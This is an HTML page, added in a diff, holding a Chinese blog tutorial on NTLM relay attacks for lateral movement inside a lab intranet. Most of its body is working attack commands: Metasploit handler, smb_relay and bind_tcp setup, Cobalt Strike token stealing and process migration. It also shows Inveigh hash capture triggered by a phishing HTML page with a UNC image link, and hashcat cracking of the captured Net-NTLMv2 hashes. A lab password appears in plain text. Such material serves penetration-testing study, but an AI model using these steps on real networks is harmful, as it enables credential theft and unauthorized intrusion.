@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      内网横向移动(七)-Relay重放&amp;Responder中继攻击 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">F4tty</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">内网横向移动(七)-Relay重放&Responder中继攻击</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-10-13 00:00:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                    <b>#</b> 内网安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="内网横向移动-七-Relay重放-amp-Responder中继攻击"><a href="#内网横向移动-七-Relay重放-amp-Responder中继攻击" class="headerlink" title="内网横向移动(七)-Relay重放&amp;Responder中继攻击"></a>内网横向移动(七)-Relay重放&amp;Responder中继攻击</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>与NLTM认证相关的安全问题主要有Pass The Hash、利用NTLM进行信息收集、Net-NTLM Hash破解、NTLM Relay几种。PTH前期已经了，运用mimikatz、impacket工具包的一些脚本、CS等等都可以利用，NTLM Relay又包括（relay to smb,ldap,ews）<br>可以应用在获取不到明文或HASH时采用的手法，但也要注意手法的必备条件。<br><img src="/posts/1a5f619c/1665544851104-603ef2c7-7657-4ddc-9f6f-9e1c5ee40a8e.png" alt="image.png"><br><img src="/posts/1a5f619c/1665544818072-73433c60-dc74-4590-b588-2c71476002cb.png" alt="image.png"><br>老样子上线webserver并提权,信息搜集<br><img src="/posts/1a5f619c/1665547898009-aa818acd-5491-4e5d-8efc-af9b59410344.png" alt="image.png"><br><img src="/posts/1a5f619c/1665547907274-8ec4cc7b-5298-4e84-9760-a8917de12177.png" alt="image.png"><br><strong>Relay重放有什么用?</strong><br>利用webserver的本地用户<code>administrator/admin!@#45</code><br>cmd输入命令 <code>dir \\192.168.3.32\c$</code><br><img src="/posts/1a5f619c/1665549191599-4e889e15-4fdb-4d91-80bf-a79a169a7bdd.png" alt="image.png"><br>发现可以直接连接sqlserver<br>这是因为再进行连接的时候会先使用当前登录的用户和密码登录目标主机进行尝试,而目标主机的账号密码也是<code>administrator/admin!@#45</code>导致连接成功<br>从而我们利用这一特性可以达成横向移动</p>
+<h2 id="NTLM中继攻击-Relay重放-SMB上线"><a href="#NTLM中继攻击-Relay重放-SMB上线" class="headerlink" title="NTLM中继攻击-Relay重放-SMB上线"></a>NTLM中继攻击-Relay重放-SMB上线</h2><p>条件：通讯双方当前用户密码一致</p>
+<h3 id="CS联动MSF"><a href="#CS联动MSF" class="headerlink" title="CS联动MSF"></a>CS联动MSF</h3><h4 id="CS配置"><a href="#CS配置" class="headerlink" title="CS配置"></a>CS配置</h4><p><img src="/posts/1a5f619c/1665557031238-ba20a8d1-78c5-4f1e-b32a-b3bd6b92651a.png" alt="image.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn msf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1a5f619c/1665557077310-d692d96a-64af-4dc6-b7ac-93a3dabc1e3d.png" alt="image.png"></p>
+<h4 id="MSF配置"><a href="#MSF配置" class="headerlink" title="MSF配置"></a>MSF配置</h4><h5 id="监听上线"><a href="#监听上线" class="headerlink" title="监听上线"></a>监听上线</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1a5f619c/1665557205270-ab8b01c4-b5d4-4159-81fb-bbf41c1fc04f.png" alt="image.png"></p>
+<h5 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p #查看当前路由表</span><br><span class="line">run post/multi/manage/autoroute #添加当前路由表</span><br><span class="line">background #返回</span><br></pre></td></tr></table></figure>
+
+<h5 id="重发模块"><a href="#重发模块" class="headerlink" title="重发模块"></a>重发模块</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/smb_relay</span><br><span class="line">set smbhost 192.168.3.32 #转发攻击目标</span><br><span class="line">set lhost 192.168.118.132 #设置本地IP</span><br><span class="line">set autorunscript post/windows/manage/migrate</span><br></pre></td></tr></table></figure>
+
+<h5 id="主动连接"><a href="#主动连接" class="headerlink" title="主动连接"></a>主动连接</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/bind_tcp #主机不出网采用正向连接</span><br><span class="line">set rhost 192.168.3.32 #设置连接目标</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1a5f619c/1665558368297-fa3cde0a-5e03-46e2-ae4a-b37db6327071.png" alt="image.png"></p>
+<h3 id="上线操作"><a href="#上线操作" class="headerlink" title="上线操作"></a>上线操作</h3><h4 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h4><p>由于我们要用本地账户去利用，但我们拿到的权限都是域用户和system用户，我们要降权到本地administrator来进行利用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">cs执行</span></span><br><span class="line">ps #查看进程</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1a5f619c/1665558551776-47948b6a-a1e1-40d1-a057-1e1d0f63dc34.png" alt="image.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal_token 3804 #窃取pid值为3804的进程</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1a5f619c/1665558639197-7891b51c-2155-4c47-9d05-bcb3ff9efbc2.png" alt="image.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\192.168.118.132\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1a5f619c/1665558698020-76b20120-4cac-47a9-9894-cfa92864cf89.png" alt="image.png"><br>显示登录失败但没关系<br><img src="/posts/1a5f619c/1665558756311-3200496b-054d-484d-9f04-6c16bd892966.png" alt="image.png"><br>msf成功接收到会话<br><img src="/posts/1a5f619c/1665558821848-89e49447-c04a-4ef0-9a96-619ea6ee9d57.png" alt="image.png"><br>成功上线</p>
+<h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps #查看进程</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1a5f619c/1665570062053-ca8e3839-ed61-4bc1-8dd8-b45ad6bac815.png" alt="image.png"><br><img src="/posts/1a5f619c/1665569892801-d4ff03c8-d0ec-4e9c-b316-53f157ef9e0d.png" alt="image.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 2660</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1a5f619c/1665570246501-f61f6ceb-4b69-4e9a-bd87-ae2ce68ff7ad.png" alt="image.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入到shell 利用smb协议</span></span><br><span class="line">shell</span><br><span class="line">dir \\192.168.118.132\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1a5f619c/1665587866506-ddd79f37-5158-4e61-b12a-0df2953bfaac.png" alt="image.png"></p>
+<h2 id="NTLM中继攻击-Inveigh嗅探-Hash破解"><a href="#NTLM中继攻击-Inveigh嗅探-Hash破解" class="headerlink" title="NTLM中继攻击-Inveigh嗅探-Hash破解"></a>NTLM中继攻击-Inveigh嗅探-Hash破解</h2><p>条件：被控主机当前管理员权限<br>Responder中继攻击-NTLM Hash破解</p>
+<h3 id="1、监听拦截"><a href="#1、监听拦截" class="headerlink" title="1、监听拦截"></a>1、监听拦截</h3><p><a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a><br>将lnveigh上传到192.168.3.32<br><img src="/posts/1a5f619c/1665661916783-74e539f0-b1c0-4ac7-b2ae-51357314b42f.png" alt="image.png"><br><img src="/posts/1a5f619c/1665662012920-680f2d41-63bc-43f3-95e2-827e607f9416.png" alt="image.png"></p>
+<h3 id="2、触发拦截"><a href="#2、触发拦截" class="headerlink" title="2、触发拦截"></a>2、触发拦截</h3><p>这个时候如果有主机来访问我们</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.3.32\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1a5f619c/1665662049146-6498db84-29f4-44c9-9f5c-065d5c9ba06d.png" alt="image.png"><br><img src="/posts/1a5f619c/1665662070372-5596069c-95d7-4069-903d-dbb4fceab591.png" alt="image.png"><br>就会拿到该主机的hash值</p>
+<h4 id="2-1、钓鱼触发"><a href="#2-1、钓鱼触发" class="headerlink" title="2.1、钓鱼触发"></a>2.1、钓鱼触发</h4><p>实战中如何触发呢?利用web服务<br>上传一个钓鱼页面到web目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/1.html C:\inetpub\wwwroot</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1a5f619c/1665668039741-dcd6a578-8092-4c87-8427-f1a8a4785246.png" alt="image.png"><br><a target="_blank" rel="noopener" href="http://192.168.3.32/1.html">http://192.168.3.32/1.html</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;img src=&quot;file:///\\192.168.3.32\2&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>钓鱼访问该链接获取到的shell会写在一个文件里<br><img src="/posts/1a5f619c/1665668793692-5f1781ae-e7c7-43f6-9a93-65629d575919.png" alt="image.png"><br>直接用命令查看显示不完整下载到本地</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download Inveigh-NTLMv2Users.txt /root/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1a5f619c/1665668845664-fb86f960-d9f7-4ca3-94d5-f5de38e2563f.png" alt="image.png"><br><img src="/posts/1a5f619c/1665669424743-dc0a6541-1a3f-49ed-9069-eec96a30407f.png" alt="image.png"></p>
+<h3 id="3、破解密文"><a href="#3、破解密文" class="headerlink" title="3、破解密文"></a>3、破解密文</h3><p><a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat/">https://github.com/hashcat/hashcat/</a></p>
+<p>pass.txt中内容为信息搜集获取到的明文密码<br>利用获取到的明文密码来爆破获取到的hash值来获取主机明文密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 [hash] pass.txt --show</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1a5f619c/1665670233906-f66e347c-5d98-4ad8-a090-5920264df22f.png" alt="image.png"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/661c6a19/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-10-13 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                        <b>#</b> 内网安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E4%B8%83-Relay%E9%87%8D%E6%94%BE-amp-Responder%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB"><span class="toc-text">内网横向移动(七)-Relay重放&amp;Responder中继攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB-Relay%E9%87%8D%E6%94%BE-SMB%E4%B8%8A%E7%BA%BF"><span class="toc-text">NTLM中继攻击-Relay重放-SMB上线</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E8%81%94%E5%8A%A8MSF"><span class="toc-text">CS联动MSF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CS%E9%85%8D%E7%BD%AE"><span class="toc-text">CS配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E9%85%8D%E7%BD%AE"><span class="toc-text">MSF配置</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E4%B8%8A%E7%BA%BF"><span class="toc-text">监听上线</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-text">添加路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%87%8D%E5%8F%91%E6%A8%A1%E5%9D%97"><span class="toc-text">重发模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BB%E5%8A%A8%E8%BF%9E%E6%8E%A5"><span class="toc-text">主动连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF%E6%93%8D%E4%BD%9C"><span class="toc-text">上线操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CS"><span class="toc-text">CS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF"><span class="toc-text">MSF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB-Inveigh%E5%97%85%E6%8E%A2-Hash%E7%A0%B4%E8%A7%A3"><span class="toc-text">NTLM中继攻击-Inveigh嗅探-Hash破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E7%9B%91%E5%90%AC%E6%8B%A6%E6%88%AA"><span class="toc-text">1、监听拦截</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E8%A7%A6%E5%8F%91%E6%8B%A6%E6%88%AA"><span class="toc-text">2、触发拦截</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1%E3%80%81%E9%92%93%E9%B1%BC%E8%A7%A6%E5%8F%91"><span class="toc-text">2.1、钓鱼触发</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E7%A0%B4%E8%A7%A3%E5%AF%86%E6%96%87"><span class="toc-text">3、破解密文</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%B8%83)-Relay%E9%87%8D%E6%94%BE%26Responder%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2F1a5f619c%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/1a5f619c/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
